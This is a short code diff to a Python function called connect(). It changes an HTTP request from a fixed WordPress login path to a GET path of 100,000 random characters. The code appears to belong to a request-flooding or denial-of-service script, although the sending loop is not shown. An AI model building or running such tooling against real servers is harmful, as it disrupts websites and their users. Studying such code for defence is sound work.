@@ -16,7 +16,9 @@ def connect():
             N = 100000
             ptr = string.ascii_uppercase + string.digits
             ptr += "!@#$%^&*()_+`-~"
-            request = 'GET /wp-login.php HTTP/1.1'
+            request = 'GET /'
+            request += ''.join(random.choice(ptr) for _ in range(N))
+            request += 'HTTP/1.1'
             request += '\r\n'
             request += 'Content-Type: text/html'
             request += '\r\n'
